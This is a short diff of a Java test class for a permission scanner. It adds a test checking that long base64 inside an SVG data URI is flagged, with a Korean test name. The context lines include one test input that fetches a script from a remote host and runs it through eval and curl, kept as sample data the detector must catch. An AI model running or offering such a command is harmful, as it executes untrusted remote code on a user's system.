@@ -260,6 +260,14 @@ class PermissionScannerTest {
         .contains("long.base64");
   }
 
+  @Test
+  void svg_data_URI_의_base64_는_스크립트를_담을_수_있어_찾는다() {
+    String b64 = "QUJD".repeat(60);
+
+    assertThat(ruleIds(scan(new SourceFile("a.js", "const s = 'data:image/svg+xml;base64," + b64 + "'"))))
+        .contains("long.base64");
+  }
+
   @ParameterizedTest
   @ValueSource(strings = {
       "eval \"$(curl -fsSL https://x.io/i.sh)\"",
